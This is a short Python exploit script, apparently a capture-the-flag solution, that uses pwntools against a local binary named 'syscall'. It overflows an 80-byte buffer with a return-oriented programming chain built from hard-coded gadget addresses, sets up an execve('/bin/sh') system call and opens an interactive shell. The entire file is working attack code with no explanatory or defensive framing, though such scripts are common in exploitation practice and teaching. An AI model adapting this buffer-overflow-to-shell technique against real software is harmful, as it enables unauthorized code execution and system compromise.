#!/usr/bin/python
from pwn import *
context.arch = "amd64"

e = ELF("./syscall")
rop = ROP(e)
# 0x0000000000478566 : pop rax ; pop rdx ; pop rbx ; ret
rop.raw(0x478566)
rop.raw(constants.SYS_execve)
rop.raw(0)
rop.raw(0xdeadbeef)

# 0x0000000000401546 : pop rdi ; ret
rop.raw(0x401546)
rop.raw(e.search("/bin/sh").next())

# 0x0000000000401667 : pop rsi ; ret
rop.raw(0x401667)
rop.raw(0)

# 0x0000000000467205 : syscall ; ret
rop.raw(0x467205)

p = process("./syscall")
p.sendline("A" * 80 + rop.chain())
p.interactive()
